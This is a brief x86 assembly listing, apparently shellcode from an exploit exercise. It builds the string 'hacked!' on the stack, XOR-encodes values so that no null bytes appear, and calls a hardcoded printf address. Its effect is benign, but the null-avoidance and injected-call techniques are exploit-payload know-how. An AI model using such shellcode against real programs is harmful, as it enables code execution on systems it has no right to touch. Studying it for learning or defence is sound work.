BITS 32
mov    ebx,esp
mov    eax, 0x41414141
xor    eax, 0x41415141 ; eax now has 0x1000
sub    ebx, eax
mov    ecx,ebx ; ecx will be used later

mov    byte [ebx], 'h'
inc    ebx
mov    byte [ebx], 'a'
inc    ebx
mov    byte [ebx], 'c'
inc    ebx
mov    byte [ebx], 'k'
inc    ebx
mov    byte [ebx], 'e'
inc    ebx
mov    byte [ebx], 'd'
inc    ebx
mov    byte [ebx], '!'
inc    ebx

xor    dl,dl        ; need end string with 0x00 but can't use "mov" with 0x00 because that's no an allowed char
mov    byte [ebx],dl ; dl has 0x00

mov    eax,0x41414141 ; set xor key
xor    eax,0x41017ec1 ; xor out prtinf location (0x41414141 ^ 0x41017ec1 = 0x00403F80)
push   ecx
call   eax 